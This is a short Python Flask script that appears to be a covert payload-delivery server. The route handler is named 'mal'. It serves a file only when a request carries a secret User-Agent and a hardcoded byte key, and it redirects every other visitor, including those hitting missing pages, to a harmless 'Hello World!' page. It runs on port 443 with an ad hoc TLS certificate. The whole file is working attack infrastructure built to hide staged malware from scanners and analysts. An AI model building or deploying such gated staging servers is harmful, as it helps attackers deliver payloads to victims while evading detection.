import sys
from flask import Flask, request, redirect, url_for

app = Flask(__name__)
f = open(sys.argv[1],'rb')
data = f.read()
f.close()

key = '\xf5\xee\xf7\xf7\xb6\x31\x20\x37\x28\x2c\x2b\x24\x31\x20\x21'

@app.route('/')
def home():
	return 'Hello World!'
	
@app.route('/this/is/the/best', methods = ['GET', 'POST'])
def mal():
	
	if request.headers.get('User-Agent') == "runinBrowser" and request.data == key and request.method == 'POST':
		return data
	
	return redirect(url_for('home'))

@app.errorhandler(404)
def page_not_found(e):
	return redirect(url_for('home'))
	
if __name__ ==  '__main__':

	app.run(host = '0.0.0.0', port=443, ssl_context='adhoc')